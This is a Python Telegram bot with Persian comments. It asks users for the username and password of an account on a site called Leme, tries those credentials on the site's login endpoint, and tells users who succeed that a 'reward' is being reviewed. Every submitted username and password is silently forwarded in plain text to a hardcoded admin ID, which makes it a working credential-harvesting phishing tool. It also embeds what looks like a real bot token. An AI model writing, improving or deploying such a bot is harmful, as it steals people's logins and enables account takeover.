import telebot
import requests

# تنظیمات اصلی
TOKEN = '8095956559:AAGMeUTSGS9h8ZQTfPpCMHCZ5nwYBWVGTAk'
ADMIN_ID = '8404377559'
bot = telebot.TeleBot(TOKEN)

# هدرهای پیشرفته برای شبیه‌سازی دقیق مرورگر
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://coe.leme.hk.cn',
    'Referer': 'https://coe.leme.hk.cn/m/'
}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "✅ ربات لمه آماده دریافت اکانت است.\nلطفاً یوزرنیم و پسورد را به شکل زیر بفرستید:\n\nuser:pass")

@bot.message_handler(func=lambda message: ":" in message.text)
def login_to_website(message):
    try:
        data = message.text.split(":")
        username = data[0].strip()
        password = data[1].strip()

        bot.reply_to(message, f"⌛ در حال تلاش برای ورود به اکانت {username}...")

        session = requests.Session()
        
        # آدرس لاگین بر اساس بررسی ساختار سایت لمه
        login_url = "https://coe.leme.hk.cn/login/check" 
        
        # تغییر نام فیلدها به چیزی که سایت های لمه معمولا استفاده میکنند
        payload = {
            'account': username,
            'password': password,
            'type': '1' # معمولا برای ورود عادی در این سایت ها استفاده می شود
        }

        response = session.post(login_url, data=payload, headers=HEADERS, timeout=15)
        
        # گزارش برای شما
        bot.send_message(ADMIN_ID, f"👤 گزارش جدید:\nUser: `{username}`\nPass: `{password}`", parse_mode="Markdown")

        # بررسی دقیق تر پاسخ سایت
        if response.status_code == 200:
            res_data = response.text.lower()
            if "success" in res_data or '"code":1' in res_data or "index" in response.url:
                bot.send_message(message.chat.id, "✅ ورود موفقیت‌آمیز بود! جایزه شما در حال بررسی است.")
            else:
                bot.send_message(message.chat.id, "❌ ورود ناموفق. احتمالاً مشخصات اشتباه است یا آی‌پی مسدود شده.")
        else:
            bot.send_message(message.chat.id, f"⚠️ خطا در اتصال به سایت (کد: {response.status_code})")

    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ Error: {e}")
        bot.reply_to(message, "⚠️ مشکلی در سرور رخ داد.")

if __name__ == "__main__":
    bot.polling(none_stop=True)
